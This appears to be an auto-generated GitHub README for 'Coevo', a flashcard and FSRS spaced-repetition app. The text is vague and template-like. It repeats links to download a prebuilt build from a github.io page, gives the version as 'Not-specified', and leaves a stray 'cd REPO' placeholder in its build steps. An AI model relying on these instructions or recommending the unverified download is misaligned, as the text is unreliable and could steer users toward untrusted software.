# Coevo - AI Learning and Spaced Repetition 2026

> **Coevo is a cross-platform study application that converts conversations into AI-created flashcards, plans FSRS review sessions, and evaluates whether learners have truly absorbed the material.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not--specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylergkzwalker6865/coevo-smart-review?style=flat-square)](https://github.com/tylergkzwalker6865/coevo-smart-review)

---

<p align="center">
  <a href="https://tylergkzwalker6865.github.io/coevo-smart-review/">
    <img src="https://img.shields.io/badge/Download-Coevo%20Latest-brightgreen?style=for-the-badge" alt="Download Coevo">
  </a>
</p>

> **[Download Coevo](https://tylergkzwalker6865.github.io/coevo-smart-review/)**

---

[Download Latest Build](https://tylergkzwalker6865.github.io/coevo-smart-review/)

---

## What Is Coevo?

Coevo is designed for learning through conversation. As dialogue develops, it finds the ideas most worth keeping and transforms them into flashcards, helping learners turn informal discussion into material they can revisit in a structured way.

The review system applies the FSRS spaced repetition algorithm to arrange recall practice over time. In addition to ordinary review, Coevo provides objective verification activities that are intended to distinguish genuine understanding from simple familiarity.

---

## Core Capabilities

- Turn learning conversations into AI-assisted flashcards
- Identify and extract meaningful concepts from dialogue
- Organize future reviews through FSRS scheduling
- Strengthen memory with structured recall sessions
- Assess internalization using objective verification steps
- Pair a Rust backend with a Flutter application layer
- Support cross-platform study workflows

---

## Getting Started

### Download a release

The newest available build can be obtained from the project page:

[Download Coevo](https://tylergkzwalker6865.github.io/coevo-smart-review/)

If the release is packaged as an archive, extract it first and then start the application appropriate for your platform.

### Compile from source

Fetch the repository and move into the checkout:

```bash
git clone https://github.com/tylergkzwalker6865/coevo-smart-review.git
cd REPO
```

Both Rust and Flutter are used by Coevo. Set up the toolchains required for the platform you are targeting, then use the repository's build guidance for the relevant application target.

---

## Learning Workflow

Coevo can be used in the following sequence:

1. Begin a conversation focused on learning.
2. Allow Coevo to locate the concepts that should be retained.
3. Work through the resulting flashcards.
4. Follow the review schedule created with FSRS.
5. Complete objective verification prompts to test whether the concepts have been internalized.
6. Keep studying as later conversations add more concepts and flashcards.

When working from a local source checkout, install Rust, Flutter, and the dependencies required by your platform before using the development or launch command documented in the repository.

---

## Settings and Configuration

Available configuration is determined by the application build and the platform on which it runs. After the initial launch, consult the project's application settings and documentation for options governing conversation processing, flashcard creation, review scheduling, and verification.

For source-based development, place machine- or environment-specific values in local configuration files and do not commit them to the repository.

---

## System Requirements

- A supported desktop or mobile operating system
- Rust toolchain for the backend components
- Flutter SDK for the application layer
- Network connectivity when required by the configured AI workflow
- Sufficient storage for flashcards, extracted concepts, and review information

Prerequisites can differ depending on the target platform and the release package being used.

---

## Frequently Asked Questions

### What platforms can run Coevo?

Coevo is built as a cross-platform application with Rust and Flutter. The precise supported targets depend on the build or release package available for use.

### Are flashcards created by hand?

The main workflow uses AI to create flashcards from conversations and to extract the concepts represented in those conversations.

### What determines review timing?

Review intervals are managed with FSRS-based spaced repetition.

### Does Coevo test real understanding?

Yes. Its learning workflow includes objective verification designed to check internalization rather than relying only on recognition during flashcard review.

### How do I find the newest build?

Visit the project download page for the latest available release:

[Download Latest Build](https://tylergkzwalker6865.github.io/coevo-smart-review/)

### What can I check if Coevo will not launch?

First ensure that the downloaded build is intended for your platform. For source builds, review the platform-specific prerequisites in the repository documentation and confirm that the necessary Rust or Flutter dependencies are installed.

---

## Planned Improvements

- Refine the process for extracting concepts from conversations
- Further improve AI-assisted flashcard creation
- Broaden the FSRS review experience
- Strengthen objective checks for learning verification
- Continue maintaining the Rust and Flutter cross-platform design

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
